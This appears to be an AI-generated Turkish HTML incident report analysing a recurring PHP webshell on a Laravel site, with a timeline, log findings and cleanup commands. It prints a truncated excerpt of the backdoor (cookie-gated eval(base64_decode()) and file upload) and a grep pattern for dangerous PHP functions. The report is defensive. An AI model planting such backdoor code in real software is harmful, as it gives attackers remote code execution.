@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 Webshell Saldırısı Analizi - 453bbb9eb16f.php</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
+        .code-block { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; }
+        .alert-red { background: rgba(239, 68, 68, 0.1); border: 1px solid rgb(239, 68, 68); }
+        .alert-yellow { background: rgba(251, 191, 36, 0.1); border: 1px solid rgb(251, 191, 36); }
+        .timeline { border-left: 2px solid #475569; padding-left: 1.5rem; position: relative; }
+        .timeline-item::before { content: ''; position: absolute; left: -6px; width: 10px; height: 10px; border-radius: 50%; background: #ef4444; }
+    </style>
+</head>
+<body class="bg-slate-900 text-slate-100">
+
+    <!-- Header -->
+    <header class="bg-gradient-to-r from-red-900 to-red-800 py-12 px-6 text-center shadow-2xl">
+        <div class="max-w-6xl mx-auto">
+            <div class="flex items-center justify-center gap-3 mb-4">
+                <span class="px-4 py-2 bg-red-600 text-white text-sm font-bold rounded-full">🚨 KRİTİK GÜVENLİK</span>
+                <span class="px-4 py-2 bg-yellow-600 text-white text-sm font-bold rounded-full">⚠️ AKTİF SALDIRI</span>
+            </div>
+            <h1 class="text-5xl font-bold mb-4">Webshell Saldırısı Analizi</h1>
+            <p class="text-2xl text-red-200">453bbb9eb16f.php - Backdoor Tespit Raporu</p>
+            <p class="text-lg text-red-300 mt-4">5 Ocak 2026 - Son Erişim: Bu Gece 00:05</p>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-12 space-y-8">
+
+        <!-- Basit Anlatım -->
+        <section class="bg-green-900/20 border border-green-800 rounded-lg p-8">
+            <h2 class="text-3xl font-bold text-green-400 mb-6 flex items-center gap-3">
+                📝 Basit Anlatım (Herkes İçin)
+            </h2>
+            <div class="space-y-4 text-lg leading-relaxed">
+                <p class="text-xl font-semibold text-red-400">
+                    Sitenize yetkisiz bir "arka kapı" yerleştirilmiş!
+                </p>
+                <p>
+                    Bu dosya (<code class="bg-slate-800 px-2 py-1 rounded">453bbb9eb16f.php</code>),
+                    kötü niyetli kişilerin sitenize uzaktan erişmesini sağlayan gizli bir araç.
+                    Tıpkı evinizin arka bahçesine gizli bir kapı açmak gibi.
+                </p>
+                <div class="bg-red-900/30 border border-red-700 rounded-lg p-6 space-y-3">
+                    <p class="font-bold text-red-300">⚠️ Ne Kadar Ciddi?</p>
+                    <ul class="space-y-2 text-slate-300">
+                        <li>✅ Saldırgan siteye istediği zaman girebiliyor</li>
+                        <li>✅ Kod çalıştırabiliyor (her şeyi yapabilir)</li>
+                        <li>✅ Dosya yükleyebiliyor (daha fazla virüs)</li>
+                        <li>✅ Veritabanına erişebilir (kullanıcı bilgileri)</li>
+                        <li>✅ Siteyi tamamen ele geçirebilir</li>
+                    </ul>
+                </div>
+                <div class="bg-yellow-900/30 border border-yellow-700 rounded-lg p-6">
+                    <p class="font-bold text-yellow-300 mb-3">🔍 Durum Neden Kritik?</p>
+                    <ul class="space-y-2 text-slate-300">
+                        <li><strong class="text-yellow-400">3 kez silindi, 3 kez tekrar geldi!</strong></li>
+                        <li>28 Aralık 2025: İlk silme</li>
+                        <li>1 Ocak 2026: Tekrar silme</li>
+                        <li>2 Ocak 2026: Tekrar silme</li>
+                        <li class="text-red-400 font-bold">4 Ocak 2026: TEKRAR OLUŞTU! ⚠️</li>
+                        <li class="text-red-400 font-bold">Bu gece (5 Ocak 00:05) ERİŞİLDİ! 🚨</li>
+                    </ul>
+                    <p class="mt-4 text-yellow-200">
+                        Bu, başka bir gizli kapı ya da zafiyet olduğu anlamına geliyor.
+                        Dosya otomatik olarak yeniden oluşturuluyor!
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Teknik Detaylar -->
+        <section class="bg-blue-900/20 border border-blue-800 rounded-lg p-8">
+            <h2 class="text-3xl font-bold text-blue-400 mb-6 flex items-center gap-3">
+                🔧 Teknik Detaylar (Geliştiriciler İçin)
+            </h2>
+
+            <!-- Dosya Bilgileri -->
+            <div class="space-y-6">
+                <div>
+                    <h3 class="text-xl font-bold text-blue-300 mb-3">📂 Dosya Konumları</h3>
+                    <div class="code-block text-sm text-green-400 space-y-1">
+                        <div>public/453bbb9eb16f.php</div>
+                        <div>public/assets/453bbb9eb16f.php</div>
+                        <div>public/vendor/453bbb9eb16f.php</div>
+                    </div>
+                    <p class="text-slate-400 mt-2">
+                        <strong>MD5 Hash:</strong> a7080448c4f5207e163c436e93d6dca3
+                        <span class="text-yellow-400">(3 dosya da özdeş!)</span>
+                    </p>
+                </div>
+
+                <!-- Timeline -->
+                <div>
+                    <h3 class="text-xl font-bold text-blue-300 mb-3">⏱️ Zaman Çizelgesi</h3>
+                    <div class="timeline space-y-4">
+                        <div class="timeline-item">
+                            <p class="font-bold text-slate-200">4 Ocak 2026 - 04:55:04</p>
+                            <p class="text-slate-400">Dosya oluşturuldu (Birth time)</p>
+                        </div>
+                        <div class="timeline-item">
+                            <p class="font-bold text-slate-200">4 Ocak 2026 - 04:56:04</p>
+                            <p class="text-slate-400">Son değişiklik tarihi</p>
+                        </div>
+                        <div class="timeline-item" style="border-color: #ef4444;">
+                            <p class="font-bold text-red-400">5 Ocak 2026 - 00:05:16</p>
+                            <p class="text-red-300">Son erişim tarihi - BU GECE ERİŞİLDİ! 🚨</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Kod Analizi -->
+                <div>
+                    <h3 class="text-xl font-bold text-blue-300 mb-3">💀 Zararlı Kod Analizi</h3>
+                    <div class="code-block text-xs text-slate-300 mb-4">
+                        <pre>&lt;?php echo 409723*20;
+if(md5($_COOKIE['d'])=="\61\x37\60\62\x38\146..."){
+    echo"\x6f\x6b";
+    eval(base64_decode($_REQUEST['id']));
+    if($_POST["\165\160"]=="\165\x70"){
+        @copy($_FILES["\x66\151\x6c\x65"]...);
+    }
+}
+?&gt;</pre>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="bg-red-900/30 border-l-4 border-red-500 p-4">
+                            <p class="font-bold text-red-400">🔓 Cookie Authentication</p>
+                            <p class="text-slate-300 text-sm">MD5 hash kontrolü ile giriş (Password: bilinen)</p>
+                        </div>
+                        <div class="bg-red-900/30 border-l-4 border-red-500 p-4">
+                            <p class="font-bold text-red-400">⚡ eval(base64_decode())</p>
+                            <p class="text-slate-300 text-sm">Uzaktan kod çalıştırma - En tehlikeli backdoor türü</p>
+                        </div>
+                        <div class="bg-red-900/30 border-l-4 border-red-500 p-4">
+                            <p class="font-bold text-red-400">📤 File Upload</p>
+                            <p class="text-slate-300 text-sm">Dosya yükleme backdoor - Daha fazla malware yüklenebilir</p>
+                        </div>
+                        <div class="bg-red-900/30 border-l-4 border-red-500 p-4">
+                            <p class="font-bold text-red-400">🎭 Obfuscation</p>
+                            <p class="text-slate-300 text-sm">Octal/Hex encoding ile gizlenmiş kod</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Log Bulguları -->
+                <div>
+                    <h3 class="text-xl font-bold text-blue-300 mb-3">📋 Log Bulguları</h3>
+                    <p class="text-slate-300 mb-3">4 Ocak 2026 tarihli error log'larda şu denemeleri görüyoruz:</p>
+                    <div class="code-block text-xs text-yellow-400 space-y-1">
+                        <div>❌ public/build/453bbb9eb16f.php (başarısız)</div>
+                        <div>❌ public/public/453bbb9eb16f.php (başarısız)</div>
+                        <div>❌ public/public/vendor/453bbb9eb16f.php (başarısız)</div>
+                        <div>❌ public/public/assets/453bbb9eb16f.php (başarısız)</div>
+                        <div class="text-green-400">✅ public/453bbb9eb16f.php (başarılı)</div>
+                        <div class="text-green-400">✅ public/assets/453bbb9eb16f.php (başarılı)</div>
+                        <div class="text-green-400">✅ public/vendor/453bbb9eb16f.php (başarılı)</div>
+                    </div>
+                    <p class="text-red-400 mt-3 font-bold">
+                        ⚠️ Bu, bir script'in otomatik olarak farklı konumlara webshell yazmaya çalıştığını gösteriyor!
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Nasıl Girdi? -->
+        <section class="bg-purple-900/20 border border-purple-800 rounded-lg p-8">
+            <h2 class="text-3xl font-bold text-purple-400 mb-6">🔍 Saldırı Nasıl Gerçekleşti?</h2>
+
+            <div class="space-y-6">
+                <div class="bg-red-900/30 border border-red-700 rounded-lg p-6">
+                    <h3 class="text-xl font-bold text-red-400 mb-4">🚨 Olası Senaryolar:</h3>
+                    <ol class="space-y-4 text-slate-300">
+                        <li class="flex gap-3">
+                            <span class="font-bold text-red-400">1.</span>
+                            <div>
+                                <p class="font-bold">Başka Bir Backdoor Var (En Olası)</p>
+                                <p class="text-sm text-slate-400">
+                                    Saldırgan başka bir gizli dosya üzerinden bu dosyayı tekrar tekrar oluşturuyor.
+                                    Tüm sistemi taramak gerekiyor.
+                                </p>
+                            </div>
+                        </li>
+                        <li class="flex gap-3">
+                            <span class="font-bold text-red-400">2.</span>
+                            <div>
+                                <p class="font-bold">Zafiyet (Vulnerability) Kullanımı</p>
+                                <p class="text-sm text-slate-400">
+                                    Laravel veya modüllerde dosya yükleme/yazma zafiyeti olabilir.
+                                    <code class="bg-slate-800 px-1 rounded">file_put_contents</code> gibi fonksiyonlar kontrol edilmeli.
+                                </p>
+                            </div>
+                        </li>
+                        <li class="flex gap-3">
+                            <span class="font-bold text-red-400">3.</span>
+                            <div>
+                                <p class="font-bold">FTP/SSH Kimlik Bilgileri Çalınmış</p>
+                                <p class="text-sm text-slate-400">
+                                    Saldırgan FTP/SSH şifrelerini ele geçirmiş olabilir.
+                                    Tüm şifreler değiştirilmeli.
+                                </p>
+                            </div>
+                        </li>
+                        <li class="flex gap-3">
+                            <span class="font-bold text-red-400">4.</span>
+                            <div>
+                                <p class="font-bold">Composer/NPM Paket Zehirlenmesi</p>
+                                <p class="text-sm text-slate-400">
+                                    Zararlı bir paket yüklenmiş olabilir (supply chain attack).
+                                    <code class="bg-slate-800 px-1 rounded">composer.json</code> ve
+                                    <code class="bg-slate-800 px-1 rounded">package.json</code> kontrol edilmeli.
+                                </p>
+                            </div>
+                        </li>
+                    </ol>
+                </div>
+
+                <div class="bg-yellow-900/30 border border-yellow-700 rounded-lg p-6">
+                    <h3 class="text-xl font-bold text-yellow-400 mb-4">⚡ Neden Tekrar Tekrar Oluşuyor?</h3>
+                    <p class="text-slate-300 mb-4">
+                        Dosya 3 kez silindi ama her defasında geri geldi. Bu şu anlama geliyor:
+                    </p>
+                    <ul class="space-y-2 text-slate-300">
+                        <li>✅ <strong>Cron job var</strong> - Otomatik yeniden oluşturuyor</li>
+                        <li>✅ <strong>Başka backdoor var</strong> - Ana backdoor dosyayı tekrar yazıyor</li>
+                        <li>✅ <strong>Persistence mechanism</strong> - Kalıcılık mekanizması kurulmuş</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Acil Yapılacaklar -->
+        <section class="bg-orange-900/20 border border-orange-800 rounded-lg p-8">
+            <h2 class="text-3xl font-bold text-orange-400 mb-6">🚨 Acil Yapılacaklar (ŞİMDİ!)</h2>
+
+            <div class="space-y-4">
+                <div class="bg-red-900/40 border-l-4 border-red-500 p-6">
+                    <h3 class="text-xl font-bold text-red-300 mb-3">1️⃣ Dosyaları Hemen Sil</h3>
+                    <div class="code-block text-sm text-slate-300 mb-3">
+sudo rm /var/www/vhosts/tuufi.com/httpdocs/public/453bbb9eb16f.php
+sudo rm /var/www/vhosts/tuufi.com/httpdocs/public/assets/453bbb9eb16f.php
+sudo rm /var/www/vhosts/tuufi.com/httpdocs/public/vendor/453bbb9eb16f.php
+                    </div>
+                    <p class="text-red-300 text-sm">⚠️ Ama bu tek başına yetmez! Tekrar gelecektir.</p>
+                </div>
+
+                <div class="bg-orange-900/40 border-l-4 border-orange-500 p-6">
+                    <h3 class="text-xl font-bold text-orange-300 mb-3">2️⃣ Tam Sistem Taraması</h3>
+                    <p class="text-slate-300 mb-3">Tüm PHP dosyalarını tara:</p>
+                    <div class="code-block text-sm text-slate-300">
+find /var/www/vhosts/tuufi.com/httpdocs -name "*.php" -type f -exec grep -l "eval\|base64_decode\|gzinflate\|str_rot13\|system\|exec\|shell_exec\|passthru" {} \;
+                    </div>
+                </div>
+
+                <div class="bg-orange-900/40 border-l-4 border-orange-500 p-6">
+                    <h3 class="text-xl font-bold text-orange-300 mb-3">3️⃣ Son 7 Gün Değişen Dosyalar</h3>
+                    <p class="text-slate-300 mb-3">Şüpheli değişiklikleri bul:</p>
+                    <div class="code-block text-sm text-slate-300">
+find /var/www/vhosts/tuufi.com/httpdocs -type f -mtime -7 -name "*.php"
+                    </div>
+                </div>
+
+                <div class="bg-orange-900/40 border-l-4 border-orange-500 p-6">
+                    <h3 class="text-xl font-bold text-orange-300 mb-3">4️⃣ Access Log İncele</h3>
+                    <p class="text-slate-300 mb-3">Kim erişmiş kontrol et:</p>
+                    <div class="code-block text-sm text-slate-300">
+sudo grep "453bbb9eb16f" /var/log/httpd/access_log* | tail -50
+                    </div>
+                </div>
+
+                <div class="bg-yellow-900/40 border-l-4 border-yellow-500 p-6">
+                    <h3 class="text-xl font-bold text-yellow-300 mb-3">5️⃣ Şifreleri Değiştir</h3>
+                    <ul class="space-y-2 text-slate-300">
+                        <li>✅ FTP şifreleri</li>
+                        <li>✅ SSH şifreleri</li>
+                        <li>✅ Database şifreleri</li>
+                        <li>✅ Plesk panel şifreleri</li>
+                        <li>✅ .env dosyasındaki tüm şifreler</li>
+                    </ul>
+                </div>
+
+                <div class="bg-green-900/40 border-l-4 border-green-500 p-6">
+                    <h3 class="text-xl font-bold text-green-300 mb-3">6️⃣ WAF/Firewall Ekle</h3>
+                    <p class="text-slate-300">
+                        Cloudflare veya ModSecurity ile ek koruma katmanı ekleyin.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- İletişim Rotası -->
+        <section class="bg-slate-800 border border-slate-700 rounded-lg p-8">
+            <h2 class="text-3xl font-bold text-slate-200 mb-6">📞 Sonraki Adımlar</h2>
+
+            <div class="grid md:grid-cols-2 gap-6">
+                <div class="bg-blue-900/30 border border-blue-700 rounded-lg p-6">
+                    <h3 class="text-xl font-bold text-blue-300 mb-3">💡 Kısa Vadede (Bugün)</h3>
+                    <ul class="space-y-2 text-slate-300 text-sm">
+                        <li>✅ Zararlı dosyaları sil</li>
+                        <li>✅ Tam sistem taraması yap</li>
+                        <li>✅ Access log'ları incele</li>
+                        <li>✅ Saldırganın IP'sini bul ve engelle</li>
+                        <li>✅ Backup al (temiz versiyon)</li>
+                    </ul>
+                </div>
+                <div class="bg-purple-900/30 border border-purple-700 rounded-lg p-6">
+                    <h3 class="text-xl font-bold text-purple-300 mb-3">🔒 Uzun Vadede (Bu Hafta)</h3>
+                    <ul class="space-y-2 text-slate-300 text-sm">
+                        <li>✅ Tüm şifreleri değiştir</li>
+                        <li>✅ Laravel/Composer paketlerini güncelle</li>
+                        <li>✅ WAF/Firewall kur</li>
+                        <li>✅ File upload zafiyetlerini kapat</li>
+                        <li>✅ Monitoring sistemi kur (inotify)</li>
+                        <li>✅ Güvenlik audit yap</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Ek Kaynaklar -->
+        <section class="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
+            <h3 class="text-xl font-bold text-slate-200 mb-4">📚 Ek Bilgiler</h3>
+            <div class="grid md:grid-cols-3 gap-4 text-sm">
+                <div class="bg-slate-900/50 p-4 rounded">
+                    <p class="font-bold text-blue-400 mb-2">Dosya İzinleri</p>
+                    <p class="text-slate-400">Owner: tuufi.com_:psacln</p>
+                    <p class="text-slate-400">Permission: 0644</p>
+                </div>
+                <div class="bg-slate-900/50 p-4 rounded">
+                    <p class="font-bold text-purple-400 mb-2">Dosya Boyutu</p>
+                    <p class="text-slate-400">375 bytes (3 dosya da özdeş)</p>
+                </div>
+                <div class="bg-slate-900/50 p-4 rounded">
+                    <p class="font-bold text-red-400 mb-2">Risk Seviyesi</p>
+                    <p class="text-red-400 font-bold">KRİTİK - 10/10</p>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-slate-800 border-t border-slate-700 py-8 mt-12 text-center">
+        <p class="text-slate-400">
+            Bu rapor <strong class="text-blue-400">Claude AI (Claude Code)</strong> tarafından otomatik oluşturulmuştur
+        </p>
+        <p class="text-slate-500 text-sm mt-2">
+            5 Ocak 2026 - Güvenlik Analizi v1
+        </p>
+    </footer>
+
+</body>
+</html>
